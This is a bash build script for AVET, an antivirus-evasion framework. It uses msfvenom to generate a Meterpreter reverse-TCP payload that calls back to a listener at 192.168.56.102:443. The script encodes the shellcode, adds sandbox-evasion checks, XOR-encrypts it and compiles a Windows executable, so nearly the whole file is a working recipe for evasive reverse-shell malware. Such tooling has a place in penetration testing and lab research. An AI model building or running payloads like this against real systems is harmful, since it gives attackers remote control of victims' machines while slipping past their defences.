#!/bin/bash      
# example build script

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# generate payload
#msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443 -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/scraw.txt

# import feature construction interface
. build/feature_construction.sh

# add evasion techniques
add_evasion fopen_sandbox_evasion
add_evasion gethostbyname_sandbox_evasion
append_value HOSTVALUE "this.that" source/evasion/evasion.include
#add_evasion hide_console

# set shellcode source
# convert from raw to C format using the built-in tool
./tools/data_raw_to_c/data_raw_to_c input/scraw.txt input/sc.txt buf
set_shellcode_source static_from_file input/sc.txt

# encode shellcode
# length of generated key is 4 bytes
encode_shellcode xor input/scraw.txt input/scenc.txt 4 input/keyraw.txt
# convert generated key from raw to C
# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input key.txt buf

# set key source
set_key_source static_from_file input/key.txt

# set decoder
set_decoder xor

# set shellcode binding technique
set_shellcode_binding exec_shellcode

# enable debug printing
enable_debug_print

# compile
$win32_compiler -o output/output.exe source/avet.c -lws2_32

# cleanup
#rm output/thepayload.bin
#rm output/pwn.exe
cleanup_techniques
